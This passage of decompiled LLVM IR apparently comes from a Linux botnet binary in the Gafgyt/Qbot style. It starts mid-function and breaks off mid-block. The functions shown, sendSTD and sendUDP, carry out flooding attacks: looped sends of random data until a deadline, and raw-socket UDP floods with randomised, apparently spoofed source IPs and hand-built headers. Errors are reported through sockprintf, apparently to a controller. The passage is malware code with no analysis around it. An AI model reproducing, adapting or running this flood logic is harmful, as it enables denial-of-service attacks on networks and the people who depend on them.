  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @reset_telstate, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 513, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %arg1, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804e0dc, { 33, 1, 7, 8, 2, 9, 10, 11, 12, 13, 14, 15, 16, 3, 17, 18, 19, 20, 21, 22, 4, 23, 24, 25, 5, 26, 27, 28, 29, 30, 6, 31, 32, 0 }
  uselistorder label %dec_label_pc_804d15a, { 1, 0 }
  uselistorder label %dec_label_pc_804d10c, { 1, 0 }
  uselistorder label %dec_label_pc_804d100, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d0ef, { 2, 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e0f0 = load i32, i32* @ebp, align 4
  store i32 %v0_804e0f0, i32* %stack_var_-4, align 4
  %v4_804e0f0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804e0f0, i32* @ebp, align 4
  %v4_804e110 = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_804e11f = call i32 @__GI_time(i32* null)
  %v1_804e12d = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_804e135 = ptrtoint i32* %stack_var_-40 to i32
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_804e156 = add i32 %v1_804e12d, 12
  %v2_804e156 = inttoptr i32 %v1_804e156 to i32*
  %v3_804e156 = load i32, i32* %v2_804e156, align 4
  %v2_804e15e = ptrtoint i32* %stack_var_-36 to i32
  %v1_804e164 = add i32 %v1_804e12d, 16
  %v2_804e164 = inttoptr i32 %v1_804e164 to i32*
  %v3_804e164 = load i32, i32* %v2_804e164, align 4
  %v1_804e167 = inttoptr i32 %v3_804e164 to i32*
  %v2_804e167 = load i32, i32* %v1_804e167, align 4
  %v4_804e174 = call i32 @bcopy(i32 %v2_804e167, i32 %v2_804e15e, i32 %v3_804e156)
  %v1_804e17c = add i32 %v1_804e12d, 8
  %v2_804e17c = inttoptr i32 %v1_804e17c to i32*
  %v3_804e17c = load i32, i32* %v2_804e17c, align 4
  %v1_804e17f = urem i32 %v3_804e17c, 65536
  store i32 %v1_804e17f, i32* %stack_var_-40, align 4
  %v4_804e1b2 = bitcast i32* %stack_var_-184 to i16*
  %v5_804e25a = add i32 %v2_804e11f, %arg3
  br label %dec_label_pc_804e197

dec_label_pc_804e197:                             ; preds = %dec_label_pc_804e27f, %entry
  %storemerge = phi i32 [ %v4_804e27f, %dec_label_pc_804e27f ], [ 0, %entry ]
  %v5_804e1b2 = call i32 @memcpy(i16* %v4_804e1b2, i32 ptrtoint ([36 x i8*]* @global_var_8059060.299 to i32), i32 144)
  store i32 %v5_804e1b2, i32* @eax, align 4
  %v0_804e1b7 = call i32 @random()
  %tmp = icmp ult i32 %storemerge, 50
  br i1 %tmp, label %dec_label_pc_804e27f, label %dec_label_pc_804e20d

dec_label_pc_804e20d:                             ; preds = %dec_label_pc_804e197
  %v0_804e1fd = load i32, i32* @ebp, align 4
  %v3_804e1fd = add i32 %v0_804e1fd, -180
  %v2_804e1d2 = udiv i32 %v0_804e1b7, 36
  %tmp29 = mul nsw i32 %v2_804e1d2, -4
  %v2_804e1ef = add i32 %v0_804e1b7, %tmp29
  %v2_804e1fd = mul i32 %v2_804e1ef, 4
  %v4_804e1fd = add i32 %v3_804e1fd, %v2_804e1fd
  %v5_804e1fd = inttoptr i32 %v4_804e1fd to i32*
  %v6_804e1fd = load i32, i32* %v5_804e1fd, align 4
  %v5_804e22a = call i32 @__libc_send(i32 %v4_804e110, i32 %v6_804e1fd, i32 65, i32 0)
  %v4_804e244 = call i32 @__libc_connect(i32 %v4_804e110, i32 %v2_804e135, i32 16)
  %v2_804e250 = call i32 @__GI_time(i32* null)
  %v5_804e25f = icmp slt i32 %v2_804e250, %v5_804e25a
  br i1 %v5_804e25f, label %dec_label_pc_804e27f, label %dec_label_pc_804e261

dec_label_pc_804e261:                             ; preds = %dec_label_pc_804e20d
  %v1_804e267 = call i32 @__libc_close(i32 %v4_804e110)
  %v1_804e273 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804e27f:                             ; preds = %dec_label_pc_804e20d, %dec_label_pc_804e197
  %stack_var_-12.0 = phi i32 [ %storemerge, %dec_label_pc_804e197 ], [ 0, %dec_label_pc_804e20d ]
  %v4_804e27f = add i32 %stack_var_-12.0, 1
  br label %dec_label_pc_804e197

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v1_804e12d, { 1, 0, 2 }
  uselistorder i32 %v4_804e110, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32 144, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i64 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16 @__decompiler_undefined_function_5()
  %tmp32 = call i16 @__decompiler_undefined_function_5()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %v0_804e28b = load i32, i32* @ebx, align 4
  %v13_804e28c = ptrtoint i32* %stack_var_-140 to i32
  store i32 2, i32* %stack_var_-68, align 4
  %v4_804e295 = icmp eq i32 %arg2, 0
  %v1_804e299 = icmp eq i1 %v4_804e295, false
  br i1 %v1_804e299, label %dec_label_pc_804e2a9, label %dec_label_pc_804e29b

dec_label_pc_804e29b:                             ; preds = %entry
  %v1_804e29b = call i32 @rand_cmwc(i32 2)
  br label %dec_label_pc_804e2be

dec_label_pc_804e2a9:                             ; preds = %entry
  %v1_804e2ac = urem i32 %arg2, 65536
  store i32 %v1_804e2ac, i32* %eax.global-to-local, align 4
  store i32 %v1_804e2ac, i32* %stack_var_-140, align 4
  %v1_804e2b2 = trunc i32 %arg2 to i16
  %v2_804e2b2 = call i32 @htons(i16 %v1_804e2b2)
  br label %dec_label_pc_804e2be

dec_label_pc_804e2be:                             ; preds = %dec_label_pc_804e29b, %dec_label_pc_804e2a9
  %v2_804e2be = ptrtoint i32* %stack_var_-68 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %stack_var_-140, align 4
  %v4_804e2ce = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-64)
  store i32 %v4_804e2ce, i32* %eax.global-to-local, align 4
  %v1_804e2d3 = icmp eq i32 %v4_804e2ce, 0
  %v1_804e2d5 = icmp eq i1 %v1_804e2d3, false
  br i1 %v1_804e2d5, label %dec_label_pc_804e77c, label %dec_label_pc_804e2db

dec_label_pc_804e2db:                             ; preds = %dec_label_pc_804e2be
  store i32 %arg6, i32* %eax.global-to-local, align 4
  %v9_804e2f4 = icmp eq i32 %arg4, 32
  %v1_804e2f8 = icmp eq i1 %v9_804e2f4, false
  br i1 %v1_804e2f8, label %dec_label_pc_804e434, label %dec_label_pc_804e2fe

dec_label_pc_804e2fe:                             ; preds = %dec_label_pc_804e2db
  store i32 2, i32* %stack_var_-140, align 4
  %v4_804e315 = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 %v4_804e315, i32* %eax.global-to-local, align 4
  %v4_804e31d = icmp eq i32 %v4_804e315, 0
  %v1_804e321 = icmp eq i1 %v4_804e31d, false
  br i1 %v1_804e321, label %dec_label_pc_804e33d, label %dec_label_pc_804e323

dec_label_pc_804e323:                             ; preds = %dec_label_pc_804e2fe
  %v0_804e323 = load i32, i32* @global_var_805b540.20, align 64
  store i32 %v0_804e323, i32* %eax.global-to-local, align 4
  store i32 %v0_804e323, i32* %stack_var_-140, align 4
  %v3_804e333 = call i32 @sockprintf(i32 %v0_804e323, i32 ptrtoint ([27 x i8]* @global_var_80590f0.300 to i32))
  store i32 %v3_804e333, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e77c

dec_label_pc_804e33d:                             ; preds = %dec_label_pc_804e2fe
  %v1_804e340 = add i32 %arg5, 1
  store i32 %v1_804e340, i32* %eax.global-to-local, align 4
  store i32 %v1_804e340, i32* %stack_var_-140, align 4
  %v1_804e344 = call i32 @malloc(i32 %v1_804e340)
  store i32 %v1_804e344, i32* %eax.global-to-local, align 4
  %v4_804e34c = icmp eq i32 %v1_804e344, 0
  br i1 %v4_804e34c, label %dec_label_pc_804e77c, label %dec_label_pc_804e356

dec_label_pc_804e356:                             ; preds = %dec_label_pc_804e33d
  store i32 %v1_804e340, i32* %edx.global-to-local, align 4
  %v1_804e35f = inttoptr i32 %v1_804e344 to i8*
  store i32 %v1_804e344, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_804e364 = and i32 %v1_804e344, -256
  store i32 %v1_804e364, i32* %eax.global-to-local, align 4
  %v5_804e366 = call i8* @_memset(i8* %v1_804e35f, i32 %v1_804e364, i32 %v1_804e340)
  store i32 %v1_804e344, i32* %eax.global-to-local, align 4
  store i32 %v1_804e344, i32* %stack_var_-140, align 4
  %v4_804e375 = call i32 @makeRandomStr(i8* %v1_804e35f, i32 %arg5)
  store i32 %v4_804e375, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-140, align 4
  %v2_804e381 = call i32 @__GI_time(i32* null)
  %v5_804e386 = add i32 %v2_804e381, %arg3
  store i32 %v5_804e386, i32* %eax.global-to-local, align 4
  %sext = mul i64 %arg8, 4294967296
  %v2_804e412 = sdiv i64 %sext, 4294967296
  %v3_804e412 = mul nsw i64 %v2_804e412, 1000
  %v4_804e412 = trunc i64 %v3_804e412 to i32
  br label %dec_label_pc_804e39c.outer

dec_label_pc_804e39c.outer:                       ; preds = %dec_label_pc_804e40f, %dec_label_pc_804e42c, %dec_label_pc_804e356
  %stack_var_-88.0.ph = phi i32 [ 0, %dec_label_pc_804e356 ], [ 0, %dec_label_pc_804e40f ], [ %v4_804e42c, %dec_label_pc_804e42c ]
  %stack_var_-92.0.ph = phi i32 [ 0, %dec_label_pc_804e356 ], [ %v4_804e404, %dec_label_pc_804e40f ], [ %v4_804e404, %dec_label_pc_804e42c ]
  br label %dec_label_pc_804e39c

dec_label_pc_804e39c:                             ; preds = %dec_label_pc_804e39c.outer, %dec_label_pc_804e3e6
  %stack_var_-92.0 = phi i32 [ 0, %dec_label_pc_804e3e6 ], [ %stack_var_-92.0.ph, %dec_label_pc_804e39c.outer ]
  store i32 %arg5, i32* %edx.global-to-local, align 4
  store i32 %v4_804e315, i32* %eax.global-to-local, align 4
  store i32 %v4_804e315, i32* %stack_var_-140, align 4
  %v7_804e3c7 = call i32 @__libc_sendto(i32 %v4_804e315, i32 %v1_804e344, i32 %arg5, i32 0, i32 %v2_804e2be, i32 16)
  store i32 %v7_804e3c7, i32* %eax.global-to-local, align 4
  store i32 %arg6, i32* %edx.global-to-local, align 4
  %v15_804e3cf = icmp eq i32 %stack_var_-92.0, %arg6
  %v1_804e3d2 = icmp eq i1 %v15_804e3cf, false
  br i1 %v1_804e3d2, label %dec_label_pc_804e404, label %dec_label_pc_804e3d4

dec_label_pc_804e3d4:                             ; preds = %dec_label_pc_804e39c
  br i1 %v1_804e299, label %dec_label_pc_804e3e6, label %dec_label_pc_804e3da

dec_label_pc_804e3da:                             ; preds = %dec_label_pc_804e3d4
  %v0_804e3da = load i32, i32* %stack_var_-140, align 4
  %v1_804e3da = call i32 @rand_cmwc(i32 %v0_804e3da)
  %v1_804e3df = urem i32 %v1_804e3da, 65536
  store i32 %v1_804e3df, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e3e6

dec_label_pc_804e3e6:                             ; preds = %dec_label_pc_804e3d4, %dec_label_pc_804e3da
  store i32 0, i32* %stack_var_-140, align 4
  %v2_804e3ed = call i32 @__GI_time(i32* null)
  store i32 %v2_804e3ed, i32* %eax.global-to-local, align 4
  %v8_804e3f5 = icmp sgt i32 %v2_804e3ed, %v5_804e386
  br i1 %v8_804e3f5, label %dec_label_pc_804e77c, label %dec_label_pc_804e39c

dec_label_pc_804e404:                             ; preds = %dec_label_pc_804e39c
  %v4_804e404 = add i32 %stack_var_-92.0, 1
  store i32 %arg7, i32* %eax.global-to-local, align 4
  %v15_804e40a = icmp eq i32 %stack_var_-88.0.ph, %arg7
  %v1_804e40d = icmp eq i1 %v15_804e40a, false
  br i1 %v1_804e40d, label %dec_label_pc_804e42c, label %dec_label_pc_804e40f

dec_label_pc_804e40f:                             ; preds = %dec_label_pc_804e404
  store i32 %v4_804e412, i32* %eax.global-to-local, align 4
  store i32 %v4_804e412, i32* %stack_var_-140, align 4
  %v2_804e41b = call i32 @usleep(i64 %v3_804e412)
  store i32 %v2_804e41b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e39c.outer

dec_label_pc_804e42c:                             ; preds = %dec_label_pc_804e404
  %v4_804e42c = add i32 %stack_var_-88.0.ph, 1
  br label %dec_label_pc_804e39c.outer

dec_label_pc_804e434:                             ; preds = %dec_label_pc_804e2db
  store i32 %v13_804e28c, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-140, align 4
  %v4_804e450 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v4_804e450, i32* %eax.global-to-local, align 4
  %v4_804e458 = icmp eq i32 %v4_804e450, 0
  %v1_804e45c = icmp eq i1 %v4_804e458, false
  br i1 %v1_804e45c, label %dec_label_pc_804e478, label %dec_label_pc_804e45e

dec_label_pc_804e45e:                             ; preds = %dec_label_pc_804e434
  %v0_804e45e = load i32, i32* @global_var_805b540.20, align 64
  store i32 %v0_804e45e, i32* %eax.global-to-local, align 4
  store i32 %v0_804e45e, i32* %stack_var_-140, align 4
  %v3_804e46e = call i32 @sockprintf(i32 %v0_804e45e, i32 ptrtoint ([27 x i8]* @global_var_80590f0.300 to i32))
  store i32 %v3_804e46e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e779

dec_label_pc_804e478:                             ; preds = %dec_label_pc_804e434
  store i32 1, i32* %stack_var_-72, align 4
  %v2_804e487 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v4_804e450, i32* %eax.global-to-local, align 4
  store i32 %v4_804e450, i32* %stack_var_-140, align 4
  %v6_804e4a4 = call i32 @__GI_setsockopt(i32 %v4_804e450, i32 0, i32 3, i32 %v2_804e487, i32 4)
  store i32 %v6_804e4a4, i32* %eax.global-to-local, align 4
  %v2_804e4a9 = icmp slt i32 %v6_804e4a4, 0
  %v1_804e4ab = icmp eq i1 %v2_804e4a9, false
  br i1 %v1_804e4ab, label %dec_label_pc_804e4fa.preheader, label %dec_label_pc_804e4ad

dec_label_pc_804e4fa.preheader:                   ; preds = %dec_label_pc_804e478
  br label %dec_label_pc_804e4d0

dec_label_pc_804e4ad:                             ; preds = %dec_label_pc_804e478
  %v0_804e4ad = load i32, i32* @global_var_805b540.20, align 64
  store i32 %v0_804e4ad, i32* %eax.global-to-local, align 4
  store i32 %v0_804e4ad, i32* %stack_var_-140, align 4
  %v3_804e4bd = call i32 @sockprintf(i32 %v0_804e4ad, i32 ptrtoint ([33 x i8]* @global_var_805910c.301 to i32))
  store i32 %v3_804e4bd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e779

dec_label_pc_804e4d0:                             ; preds = %dec_label_pc_804e4fa.preheader, %dec_label_pc_804e4d0
  %v4_804e4fa76 = phi i32 [ 49, %dec_label_pc_804e4fa.preheader ], [ %v4_804e4fa, %dec_label_pc_804e4d0 ]
  store i32 0, i32* %stack_var_-140, align 4
  %v2_804e4d7 = call i32 @__GI_time(i32* null)
  store i32 %v2_804e4d7, i32* %eax.global-to-local, align 4
  store i32 %v2_804e4d7, i32* @ebx, align 4
  %v0_804e4de = load i32, i32* %stack_var_-140, align 4
  %v1_804e4de = call i32 @rand_cmwc(i32 %v0_804e4de)
  %v1_804e4e3 = load i32, i32* @ebx, align 4
  %v2_804e4e3 = xor i32 %v1_804e4e3, %v1_804e4de
  store i32 %v2_804e4e3, i32* @eax, align 4
  store i32 %v2_804e4e3, i32* %stack_var_-140, align 4
  %v1_804e4e8 = call i32 @srand(i32 %v2_804e4e3)
  store i32 %v1_804e4e8, i32* @eax, align 4
  %v0_804e4ed = call i32 @random()
  store i32 %v0_804e4ed, i32* %eax.global-to-local, align 4
  store i32 %v0_804e4ed, i32* %stack_var_-140, align 4
  %v1_804e4f5 = call i32 @init_rand(i32 %v0_804e4ed)
  store i32 %v1_804e4f5, i32* %eax.global-to-local, align 4
  %v4_804e4fa = add nsw i32 %v4_804e4fa76, -1
  %v13_804e4fd = icmp eq i32 %v4_804e4fa76, 0
  %v1_804e501 = icmp eq i1 %v13_804e4fd, false
  br i1 %v1_804e501, label %dec_label_pc_804e4d0, label %dec_label_pc_804e503

dec_label_pc_804e503:                             ; preds = %dec_label_pc_804e4d0
  %v4_804e503 = icmp eq i32 %arg4, 0
  %v1_804e507 = icmp eq i1 %v4_804e503, false
  br i1 %v1_804e507, label %dec_label_pc_804e512, label %dec_label_pc_804e528

dec_label_pc_804e512:                             ; preds = %dec_label_pc_804e503
  %v5_804e519 = sub i32 32, %arg4
  %v2_804e521 = urem i32 %v5_804e519, 32
  %v4_804e521 = icmp eq i32 %v2_804e521, 0
  br i1 %v4_804e521, label %bb72, label %bb

bb:                                               ; preds = %dec_label_pc_804e512
  %v5_804e521 = shl i32 1, %v2_804e521
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_804e512, %bb
  %v0_804e523 = phi i32 [ %v5_804e521, %bb ], [ 1, %dec_label_pc_804e512 ]
  %v1_804e523 = sub i32 0, %v0_804e523
  store i32 %v1_804e523, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e528

dec_label_pc_804e528:                             ; preds = %dec_label_pc_804e503, %bb72
  %storemerge6 = phi i32 [ %v1_804e523, %bb72 ], [ 0, %dec_label_pc_804e503 ]
  %v1_804e52b = add i32 %arg5, 28
  %v1_804e537 = add i32 %arg5, 58
  %v2_804e53a = and i32 %v1_804e537, -16
  %v0_804e540 = load i32, i32* @esp, align 4
  %v2_804e540 = sub i32 %v0_804e540, %v2_804e53a
  %v1_804e54c = add i32 %v2_804e540, 39
  %v2_804e54f = and i32 %v1_804e54c, -16
  store i32 %v2_804e54f, i32* %edx.global-to-local, align 4
  %v1_804e567 = add i32 %v2_804e54f, 20
  %v5_804e56a = inttoptr i32 %v1_804e567 to i16*
  %v1_804e570 = add i32 %arg5, 8
  store i32 %v1_804e570, i32* @ebx, align 4
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_804e578 = inttoptr i32 %v2_804e540 to i32*
  store i32 %storemerge6, i32* %v2_804e578, align 4
  %v2_804e57b = call i32 @GetRandomIP(i32 %v1_804e52b, i32 %v2_804e54f)
  store i32 %v2_804e57b, i32* %eax.global-to-local, align 4
  %v1_804e580 = load i32, i32* @esp, align 4
  %v2_804e580 = inttoptr i32 %v1_804e580 to i32*
  store i32 %v2_804e57b, i32* %v2_804e580, align 4
  %v0_804e583 = call i32 @htonl()
  %v3_804e588 = load i32, i32* %stack_var_-64, align 4
  store i32 %v3_804e588, i32* %edx.global-to-local, align 4
  %v0_804e58b = load i32, i32* @ebx, align 4
  %v1_804e58b = load i32, i32* @esp, align 4
  %v2_804e58b = add i32 %v1_804e58b, 16
  %v3_804e58b = inttoptr i32 %v2_804e58b to i32*
  store i32 %v0_804e58b, i32* %v3_804e58b, align 4
  %v0_804e58f = load i32, i32* @esp, align 4
  %v1_804e58f = add i32 %v0_804e58f, 12
  %v2_804e58f = inttoptr i32 %v1_804e58f to i32*
  store i32 17, i32* %v2_804e58f, align 4
  %v1_804e597 = load i32, i32* @esp, align 4
  %v2_804e597 = add i32 %v1_804e597, 8
  %v3_804e597 = inttoptr i32 %v2_804e597 to i32*
  store i32 %v0_804e583, i32* %v3_804e597, align 4
  %v0_804e59b = load i32, i32* %edx.global-to-local, align 4
  %v1_804e59b = load i32, i32* @esp, align 4
  %v2_804e59b = add i32 %v1_804e59b, 4
  %v3_804e59b = inttoptr i32 %v2_804e59b to i32*
  store i32 %v0_804e59b, i32* %v3_804e59b, align 4
  store i32 %v2_804e54f, i32* %eax.global-to-local, align 4
  %v1_804e5a2 = load i32, i32* @esp, align 4
  %v2_804e5a2 = inttoptr i32 %v1_804e5a2 to i32*
  store i32 %v2_804e54f, i32* %v2_804e5a2, align 4
  %v0_804e5a5 = call i32 @makeIPPacket()
  %v1_804e5b3 = urem i32 %v1_804e570, 65536
  store i32 %v1_804e5b3, i32* %eax.global-to-local, align 4
  %v1_804e5b6 = load i32, i32* @esp, align 4
  %v2_804e5b6 = inttoptr i32 %v1_804e5b6 to i32*
  store i32 %v1_804e5b3, i32* %v2_804e5b6, align 4
  %v2_804e5b9 = trunc i32 %v1_804e567 to i16
  %v3_804e5b9 = call i32 @htons(i16 %v2_804e5b9)
  %v1_804e5be = urem i32 %v3_804e5b9, 65536
  store i32 %v1_804e5be, i32* %edx.global-to-local, align 4
  store i32 %v1_804e567, i32* %eax.global-to-local, align 4
  %v1_804e5c4 = trunc i32 %v3_804e5b9 to i16
  %v3_804e5c4 = add i32 %v2_804e54f, 24
  %v4_804e5c4 = inttoptr i32 %v3_804e5c4 to i16*
  store i16 %v1_804e5c4, i16* %v4_804e5c4, align 8
  %v2_804e5c8 = call i32 @rand_cmwc(i32 %v1_804e567)
  %v1_804e5cd = urem i32 %v2_804e5c8, 65536
  store i32 %v1_804e5cd, i32* %edx.global-to-local, align 4
  store i32 %v1_804e567, i32* %eax.global-to-local, align 4
  %v1_804e5d3 = trunc i32 %v2_804e5c8 to i16
  store i16 %v1_804e5d3, i16* %v5_804e56a, align 4
  br i1 %v1_804e299, label %dec_label_pc_804e5e9, label %dec_label_pc_804e5dc

dec_label_pc_804e5dc:                             ; preds = %dec_label_pc_804e528
  %v2_804e5dc = call i32 @rand_cmwc(i32 %v1_804e567)
  %.pre = urem i32 %arg2, 65536
  br label %dec_label_pc_804e5fd

dec_label_pc_804e5e9:                             ; preds = %dec_label_pc_804e528
  %v1_804e5ec = urem i32 %arg2, 65536
  store i32 %v1_804e5ec, i32* %eax.global-to-local, align 4
  %v1_804e5ef = load i32, i32* @esp, align 4
  %v2_804e5ef = inttoptr i32 %v1_804e5ef to i32*
  store i32 %v1_804e5ec, i32* %v2_804e5ef, align 4
  %v3_804e5f2 = call i32 @htons(i16 %tmp32)
  br label %dec_label_pc_804e5fd

dec_label_pc_804e5fd:                             ; preds = %dec_label_pc_804e5dc, %dec_label_pc_804e5e9
  %v1_804e6bd.pre-phi = phi i32 [ %.pre, %dec_label_pc_804e5dc ], [ %v1_804e5ec, %dec_label_pc_804e5e9 ]
  %storemerge8.in = phi i32 [ %v2_804e5dc, %dec_label_pc_804e5dc ], [ %v3_804e5f2, %dec_label_pc_804e5e9 ]
  %storemerge5 = trunc i32 %storemerge8.in to i16
  %sext9 = mul i32 %storemerge8.in, 65536
  %v4_804e600 = sdiv i32 %sext9, 65536
  %v3_804e603 = add i32 %v2_804e54f, 22
  %v4_804e603 = inttoptr i32 %v3_804e603 to i16*
  store i16 %storemerge5, i16* %v4_804e603, align 2
  %v1_804e60a = add i32 %v2_804e54f, 26
  %v2_804e60a = inttoptr i32 %v1_804e60a to i16*
  store i16 0, i16* %v2_804e60a, align 2
  %v1_804e613 = add i32 %v2_804e54f, 28
  store i32 %v1_804e613, i32* %edx.global-to-local, align 4
  store i32 %arg5, i32* %eax.global-to-local, align 4
  %v1_804e619 = load i32, i32* @esp, align 4
  %v2_804e619 = add i32 %v1_804e619, 4
  %v3_804e619 = inttoptr i32 %v2_804e619 to i32*
  store i32 %arg5, i32* %v3_804e619, align 4
  %v0_804e61d = load i32, i32* %edx.global-to-local, align 4
  %v1_804e61d = load i32, i32* @esp, align 4
  %v2_804e61d = inttoptr i32 %v1_804e61d to i32*
  store i32 %v0_804e61d, i32* %v2_804e61d, align 4
  %v3_804e620 = sext i16 %tmp to i32
  %v4_804e620 = inttoptr i32 %v4_804e600 to i8*
  %v5_804e620 = call i32 @makeRandomStr(i8* %v4_804e620, i32 %v3_804e620)
  store i32 %v2_804e54f, i32* %eax.global-to-local, align 4
  %v1_804e628 = or i32 %v2_804e54f, 2
  %v2_804e628 = inttoptr i32 %v1_804e628 to i16*
  %v3_804e628 = load i16, i16* %v2_804e628, align 2
  %v4_804e628 = zext i16 %v3_804e628 to i32
  store i32 %v4_804e628, i32* %edx.global-to-local, align 4
  store i32 %v2_804e54f, i32* %eax.global-to-local, align 4
  %v1_804e631 = load i32, i32* @esp, align 4
  %v2_804e631 = add i32 %v1_804e631, 4
  %v3_804e631 = inttoptr i32 %v2_804e631 to i32*
  store i32 %v4_804e628, i32* %v3_804e631, align 4
  %v0_804e635 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e635 = load i32, i32* @esp, align 4
  %v2_804e635 = inttoptr i32 %v1_804e635 to i32*
  store i32 %v0_804e635, i32* %v2_804e635, align 4
  %v4_804e638 = inttoptr i32 %v4_804e600 to i16*
  %v5_804e638 = call i32 @csum(i16* %v4_804e638, i32 %v3_804e620)
  %v1_804e63d = urem i32 %v5_804e638, 65536
  store i32 %v1_804e63d, i32* %edx.global-to-local, align 4
  store i32 %v2_804e54f, i32* %eax.global-to-local, align 4
  %v1_804e643 = trunc i32 %v5_804e638 to i16
  %v3_804e643 = or i32 %v2_804e54f, 10
  %v4_804e643 = inttoptr i32 %v3_804e643 to i16*
  store i16 %v1_804e643, i16* %v4_804e643, align 2
  %v0_804e647 = load i32, i32* @esp, align 4
  %v1_804e647 = inttoptr i32 %v0_804e647 to i32*
  store i32 0, i32* %v1_804e647, align 4
  %v2_804e64e = inttoptr i32 %v4_804e600 to i32*
  %v3_804e64e = call i32 @__GI_time(i32* %v2_804e64e)
  %v5_804e653 = add i32 %v3_804e64e, %arg3
  store i32 %v5_804e653, i32* %eax.global-to-local, align 4
  %v3_804e6e3 = or i32 %v2_804e54f, 4
  %v4_804e6e3 = inttoptr i32 %v3_804e6e3 to i16*
  %v2_804e6ff = or i32 %v2_804e54f, 12
  %v3_804e6ff = inttoptr i32 %v2_804e6ff to i32*
  %sext12 = mul i64 %arg8, 4294967296
  %v2_804e757 = sdiv i64 %sext12, 4294967296
  %v3_804e757 = mul nsw i64 %v2_804e757, 1000
  %v4_804e757 = trunc i64 %v3_804e757 to i32
  br label %dec_label_pc_804e669.outer

dec_label_pc_804e669.outer:                       ; preds = %dec_label_pc_804e754, %dec_label_pc_804e771, %dec_label_pc_804e5fd
  %stack_var_-84.0.ph = phi i32 [ 0, %dec_label_pc_804e5fd ], [ %v4_804e749, %dec_label_pc_804e771 ], [ %v4_804e749, %dec_label_pc_804e754 ]
  %stack_var_-80.0.ph = phi i32 [ 0, %dec_label_pc_804e5fd ], [ %v4_804e771, %dec_label_pc_804e771 ], [ 0, %dec_label_pc_804e754 ]
  %stack_var_-104.0.ph = phi i16 [ %tmp, %dec_label_pc_804e5fd ], [ %storemerge, %dec_label_pc_804e771 ], [ %storemerge, %dec_label_pc_804e754 ]
  br label %dec_label_pc_804e669

dec_label_pc_804e669:                             ; preds = %dec_label_pc_804e669.outer, %dec_label_pc_804e72c
  %stack_var_-84.0 = phi i32 [ 0, %dec_label_pc_804e72c ], [ %stack_var_-84.0.ph, %dec_label_pc_804e669.outer ]
  %stack_var_-104.0 = phi i16 [ %storemerge, %dec_label_pc_804e72c ], [ %stack_var_-104.0.ph, %dec_label_pc_804e669.outer ]
  store i32 %v2_804e54f, i32* %edx.global-to-local, align 4
  %v0_804e66f = load i32, i32* @esp, align 4
  %v1_804e66f = add i32 %v0_804e66f, 20
  %v2_804e66f = inttoptr i32 %v1_804e66f to i32*
  store i32 16, i32* %v2_804e66f, align 4
  %v1_804e677 = load i32, i32* @esp, align 4
  %v2_804e677 = add i32 %v1_804e677, 16
  %v3_804e677 = inttoptr i32 %v2_804e677 to i32*
  store i32 %v2_804e2be, i32* %v3_804e677, align 4
  %v0_804e67b = load i32, i32* @esp, align 4
  %v1_804e67b = add i32 %v0_804e67b, 12
  %v2_804e67b = inttoptr i32 %v1_804e67b to i32*
  store i32 0, i32* %v2_804e67b, align 4
  %v1_804e686 = load i32, i32* @esp, align 4
  %v2_804e686 = add i32 %v1_804e686, 8
  %v3_804e686 = inttoptr i32 %v2_804e686 to i32*
  store i32 %v1_804e52b, i32* %v3_804e686, align 4
  %v0_804e68a = load i32, i32* %edx.global-to-local, align 4
  %v1_804e68a = load i32, i32* @esp, align 4
  %v2_804e68a = add i32 %v1_804e68a, 4
  %v3_804e68a = inttoptr i32 %v2_804e68a to i32*
  store i32 %v0_804e68a, i32* %v3_804e68a, align 4
  store i32 %v4_804e450, i32* %eax.global-to-local, align 4
  %v1_804e691 = load i32, i32* @esp, align 4
  %v2_804e691 = inttoptr i32 %v1_804e691 to i32*
  store i32 %v4_804e450, i32* %v2_804e691, align 4
